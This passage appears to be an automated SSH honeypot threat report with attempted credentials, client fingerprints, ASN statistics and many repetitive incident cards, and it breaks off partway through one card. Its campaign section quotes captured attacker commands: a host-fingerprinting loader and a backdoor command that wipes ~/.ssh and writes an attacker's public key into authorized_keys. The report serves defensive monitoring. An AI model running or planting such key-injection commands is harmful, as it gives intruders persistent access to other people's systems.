| `qianmaolin` | `qianmaolin` | `45.198.224.120` | 2026-07-04T16:37:51 |
| `root` | `smo@@kkklss` | `129.153.145.135` | 2026-07-04T16:45:01 |
| `root` | `qwert0123` | `45.198.224.120` | 2026-07-04T16:50:58 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **588** |
| Sessions with Fingerprint | **11** |
| Unique HASSH Fingerprints | **11** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 362 |
| libssh | 24 |
| Paramiko (Python) | 20 |
| PuTTY | 1 |
| Unknown | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `0a07365cc01f...` | Generic scanner | 305 | 1 |
| `2ec37a7cc8da...` | Mirai/variant | 22 | 1 |
| `eff4c24daffc...` | Modern SSH client | 20 | 1 |
| `a2de0f306611...` | Mirai/variant | 20 | 5 |
| `f555226df196...` | Mirai/variant | 16 | 6 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `0a07365cc01f...` | Go SSH scanner | 305 | 1 | Generic scanner |
| `2ec37a7cc8da...` | Go SSH scanner | 22 | 1 | Mirai/variant |
| `eff4c24daffc...` | Go SSH scanner | 20 | 1 | Modern SSH client |
| `a2de0f306611...` | Paramiko (Python) | 20 | 5 | Mirai/variant |
| `f555226df196...` | libssh | 16 | 6 | Mirai/variant |
| `16443846184e...` | Go SSH scanner | 13 | 2 | Generic scanner |
| `95420f9d932d...` | libssh | 8 | 3 | — |
| `e54ef3ec27fe...` | Go SSH scanner | 1 | 1 | Generic scanner |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **5** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Recon Loader Script** | 🟡 MEDIUM | 20 | 1 | `T1082, T1592, T1078, T1083` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 5 | 5 | `T1021.004, T1078, T1070, T1140` |

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `2.57.122.168`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `154.221.20.92`, `101.126.88.251`, `103.186.1.158`, `43.245.248.2`, `102.210.149.236`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **33** |
| Unique ASNs | **28** |
| High-Risk ASNs | **25** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS31898` | Oracle Corporation | 5 | HIGH |
| `AS45090` | Shenzhen Tencent Computer Systems Company Limited | 2 | HIGH |
| `AS401626` | Netiface America, Inc. | 1 | HIGH |
| `AS137718` | Beijing Volcano Engine Technology Co., Ltd. | 1 | HIGH |
| `AS396982` | Google LLC | 1 | LOW |
| `AS9808` | China Mobile Communications Group Co., Ltd. | 1 | HIGH |
| `AS47890` | UNMANAGED LTD | 1 | HIGH |
| `AS14987` | Rethem Hosting LLC | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (393)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-1fe9f9015b5f

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 14:55 |
| **Last Seen** | 2026-07-04 14:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 14:55:03` | `cowrie.client.kex` |
| `2026-07-04 14:55:03` | `cowrie.login.success` |
| `2026-07-04 14:55:05` | `cowrie.session.params` |
| `2026-07-04 14:55:05` | `cowrie.command.input` |
| `2026-07-04 14:55:05` | `cowrie.log.closed` |
| `2026-07-04 14:55:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-805b1158433e

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 14:55 |
| **Last Seen** | 2026-07-04 14:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 14:55:06` | `cowrie.session.connect` |
| `2026-07-04 14:55:06` | `cowrie.client.version` |
| `2026-07-04 14:55:06` | `cowrie.client.kex` |
| `2026-07-04 14:55:07` | `cowrie.login.success` |
| `2026-07-04 14:55:08` | `cowrie.session.params` |
| `2026-07-04 14:55:08` | `cowrie.command.input` |
| `2026-07-04 14:55:08` | `cowrie.log.closed` |
| `2026-07-04 14:55:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ff21279f61f2

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 14:55 |
| **Last Seen** | 2026-07-04 14:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 14:55:10` | `cowrie.session.connect` |
| `2026-07-04 14:55:10` | `cowrie.client.version` |
| `2026-07-04 14:55:10` | `cowrie.client.kex` |
| `2026-07-04 14:55:10` | `cowrie.login.success` |
| `2026-07-04 14:55:11` | `cowrie.session.params` |
| `2026-07-04 14:55:11` | `cowrie.command.input` |
| `2026-07-04 14:55:11` | `cowrie.log.closed` |
| `2026-07-04 14:55:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-11d0b8357faa

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 14:55 |
| **Last Seen** | 2026-07-04 14:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 14:55:13` | `cowrie.session.connect` |
| `2026-07-04 14:55:13` | `cowrie.client.version` |
| `2026-07-04 14:55:13` | `cowrie.client.kex` |
| `2026-07-04 14:55:14` | `cowrie.login.success` |
| `2026-07-04 14:55:14` | `cowrie.session.params` |
| `2026-07-04 14:55:14` | `cowrie.command.input` |
| `2026-07-04 14:55:14` | `cowrie.log.closed` |
| `2026-07-04 14:55:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-03453c675d07

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 14:55 |
| **Last Seen** | 2026-07-04 14:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 14:55:16` | `cowrie.session.connect` |
| `2026-07-04 14:55:16` | `cowrie.client.version` |
| `2026-07-04 14:55:17` | `cowrie.client.kex` |
| `2026-07-04 14:55:17` | `cowrie.login.success` |
| `2026-07-04 14:55:18` | `cowrie.session.params` |
| `2026-07-04 14:55:18` | `cowrie.command.input` |
| `2026-07-04 14:55:18` | `cowrie.log.closed` |
| `2026-07-04 14:55:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1e70785c399d

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 14:55 |
| **Last Seen** | 2026-07-04 14:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 14:55:20` | `cowrie.session.connect` |
| `2026-07-04 14:55:20` | `cowrie.client.version` |
| `2026-07-04 14:55:20` | `cowrie.client.kex` |
| `2026-07-04 14:55:20` | `cowrie.login.success` |
| `2026-07-04 14:55:21` | `cowrie.session.params` |
| `2026-07-04 14:55:21` | `cowrie.command.input` |
| `2026-07-04 14:55:21` | `cowrie.log.closed` |
| `2026-07-04 14:55:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-72cd7c04ddec

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 14:55 |
| **Last Seen** | 2026-07-04 14:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 14:55:23` | `cowrie.session.connect` |
| `2026-07-04 14:55:23` | `cowrie.client.version` |
| `2026-07-04 14:55:23` | `cowrie.client.kex` |
| `2026-07-04 14:55:24` | `cowrie.login.success` |
| `2026-07-04 14:55:24` | `cowrie.session.params` |
| `2026-07-04 14:55:24` | `cowrie.command.input` |
| `2026-07-04 14:55:24` | `cowrie.log.closed` |
| `2026-07-04 14:55:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fcd416f323f3

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 14:55 |
| **Last Seen** | 2026-07-04 14:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 14:55:27` | `cowrie.session.connect` |
| `2026-07-04 14:55:27` | `cowrie.client.version` |
| `2026-07-04 14:55:27` | `cowrie.client.kex` |
| `2026-07-04 14:55:27` | `cowrie.login.success` |
| `2026-07-04 14:55:28` | `cowrie.session.params` |
| `2026-07-04 14:55:28` | `cowrie.command.input` |
| `2026-07-04 14:55:28` | `cowrie.log.closed` |
| `2026-07-04 14:55:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9f3d30331bf5

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 14:55 |
| **Last Seen** | 2026-07-04 14:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 14:55:30` | `cowrie.session.connect` |
| `2026-07-04 14:55:30` | `cowrie.client.version` |
| `2026-07-04 14:55:30` | `cowrie.client.kex` |
| `2026-07-04 14:55:31` | `cowrie.login.success` |
| `2026-07-04 14:55:31` | `cowrie.session.params` |
| `2026-07-04 14:55:31` | `cowrie.command.input` |
| `2026-07-04 14:55:31` | `cowrie.log.closed` |
| `2026-07-04 14:55:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c38382b3df00

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-04 14:55 |
| **Last Seen** | 2026-07-04 14:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 14:55:32` | `cowrie.session.connect` |
| `2026-07-04 14:55:32` | `cowrie.client.version` |
| `2026-07-04 14:55:32` | `cowrie.client.kex` |
| `2026-07-04 14:55:32` | `cowrie.login.success` |
| `2026-07-04 14:55:33` | `cowrie.session.params` |
| `2026-07-04 14:55:33` | `cowrie.command.input` |
| `2026-07-04 14:55:33` | `cowrie.log.closed` |
| `2026-07-04 14:55:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-26106cd6e1b2

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 14:55 |
| **Last Seen** | 2026-07-04 14:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 14:55:33` | `cowrie.session.connect` |
| `2026-07-04 14:55:33` | `cowrie.client.version` |
| `2026-07-04 14:55:34` | `cowrie.client.kex` |
| `2026-07-04 14:55:34` | `cowrie.login.success` |
| `2026-07-04 14:55:35` | `cowrie.session.params` |
| `2026-07-04 14:55:35` | `cowrie.command.input` |
| `2026-07-04 14:55:35` | `cowrie.log.closed` |
| `2026-07-04 14:55:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1f5ab645a75a

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 14:55 |
| **Last Seen** | 2026-07-04 14:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 14:55:37` | `cowrie.session.connect` |
| `2026-07-04 14:55:37` | `cowrie.client.version` |
| `2026-07-04 14:55:37` | `cowrie.client.kex` |
| `2026-07-04 14:55:37` | `cowrie.login.success` |
| `2026-07-04 14:55:38` | `cowrie.session.params` |
| `2026-07-04 14:55:38` | `cowrie.command.input` |
| `2026-07-04 14:55:38` | `cowrie.log.closed` |
| `2026-07-04 14:55:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f05a36337219

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 14:55 |
| **Last Seen** | 2026-07-04 14:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 14:55:40` | `cowrie.session.connect` |
| `2026-07-04 14:55:40` | `cowrie.client.version` |
| `2026-07-04 14:55:40` | `cowrie.client.kex` |
| `2026-07-04 14:55:41` | `cowrie.login.success` |
| `2026-07-04 14:55:41` | `cowrie.session.params` |
| `2026-07-04 14:55:41` | `cowrie.command.input` |
| `2026-07-04 14:55:42` | `cowrie.log.closed` |
| `2026-07-04 14:55:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9a539af6dde6

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 14:55 |
| **Last Seen** | 2026-07-04 14:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 14:55:43` | `cowrie.session.connect` |
| `2026-07-04 14:55:43` | `cowrie.client.version` |
| `2026-07-04 14:55:43` | `cowrie.client.kex` |
| `2026-07-04 14:55:44` | `cowrie.login.success` |
| `2026-07-04 14:55:45` | `cowrie.session.params` |
| `2026-07-04 14:55:45` | `cowrie.command.input` |
| `2026-07-04 14:55:45` | `cowrie.log.closed` |
| `2026-07-04 14:55:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1aabc3ab7df7

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 14:55 |
| **Last Seen** | 2026-07-04 14:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 14:55:47` | `cowrie.session.connect` |
| `2026-07-04 14:55:47` | `cowrie.client.version` |
| `2026-07-04 14:55:47` | `cowrie.client.kex` |
| `2026-07-04 14:55:47` | `cowrie.login.success` |
| `2026-07-04 14:55:48` | `cowrie.session.params` |
| `2026-07-04 14:55:48` | `cowrie.command.input` |
| `2026-07-04 14:55:48` | `cowrie.log.closed` |
| `2026-07-04 14:55:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5900cfb6852f

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 14:55 |
| **Last Seen** | 2026-07-04 14:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 14:55:50` | `cowrie.session.connect` |
| `2026-07-04 14:55:50` | `cowrie.client.version` |
| `2026-07-04 14:55:50` | `cowrie.client.kex` |
| `2026-07-04 14:55:50` | `cowrie.login.success` |
| `2026-07-04 14:55:51` | `cowrie.session.params` |
| `2026-07-04 14:55:51` | `cowrie.command.input` |
| `2026-07-04 14:55:51` | `cowrie.log.closed` |
| `2026-07-04 14:55:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d72fc701a3cc

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 14:55 |
| **Last Seen** | 2026-07-04 14:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 14:55:53` | `cowrie.session.connect` |
| `2026-07-04 14:55:53` | `cowrie.client.version` |
| `2026-07-04 14:55:53` | `cowrie.client.kex` |
| `2026-07-04 14:55:54` | `cowrie.login.success` |
| `2026-07-04 14:55:54` | `cowrie.session.params` |
| `2026-07-04 14:55:54` | `cowrie.command.input` |
| `2026-07-04 14:55:54` | `cowrie.log.closed` |
| `2026-07-04 14:55:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f9b76995f90a

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 14:55 |
| **Last Seen** | 2026-07-04 14:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 14:55:56` | `cowrie.session.connect` |
| `2026-07-04 14:55:56` | `cowrie.client.version` |
| `2026-07-04 14:55:56` | `cowrie.client.kex` |
| `2026-07-04 14:55:57` | `cowrie.login.success` |
| `2026-07-04 14:55:58` | `cowrie.session.params` |
| `2026-07-04 14:55:58` | `cowrie.command.input` |
| `2026-07-04 14:55:58` | `cowrie.log.closed` |
| `2026-07-04 14:55:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f36f40e0b763

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 14:56 |
| **Last Seen** | 2026-07-04 14:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 14:56:00` | `cowrie.session.connect` |
| `2026-07-04 14:56:00` | `cowrie.client.version` |
| `2026-07-04 14:56:00` | `cowrie.client.kex` |
| `2026-07-04 14:56:00` | `cowrie.login.success` |
| `2026-07-04 14:56:01` | `cowrie.session.params` |
| `2026-07-04 14:56:01` | `cowrie.command.input` |
| `2026-07-04 14:56:01` | `cowrie.log.closed` |
| `2026-07-04 14:56:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e3eb13ccd690

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 14:56 |
| **Last Seen** | 2026-07-04 14:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 14:56:03` | `cowrie.session.connect` |
| `2026-07-04 14:56:03` | `cowrie.client.version` |
| `2026-07-04 14:56:03` | `cowrie.client.kex` |
| `2026-07-04 14:56:03` | `cowrie.login.success` |
| `2026-07-04 14:56:04` | `cowrie.session.params` |
| `2026-07-04 14:56:04` | `cowrie.command.input` |
| `2026-07-04 14:56:04` | `cowrie.log.closed` |
| `2026-07-04 14:56:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d9b5a1c3b36a

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 14:56 |
| **Last Seen** | 2026-07-04 14:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 14:56:06` | `cowrie.session.connect` |
| `2026-07-04 14:56:06` | `cowrie.client.version` |
| `2026-07-04 14:56:06` | `cowrie.client.kex` |
| `2026-07-04 14:56:06` | `cowrie.login.success` |
| `2026-07-04 14:56:07` | `cowrie.session.params` |
| `2026-07-04 14:56:07` | `cowrie.command.input` |
| `2026-07-04 14:56:07` | `cowrie.log.closed` |
| `2026-07-04 14:56:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fa970156b254

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 14:56 |
| **Last Seen** | 2026-07-04 14:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
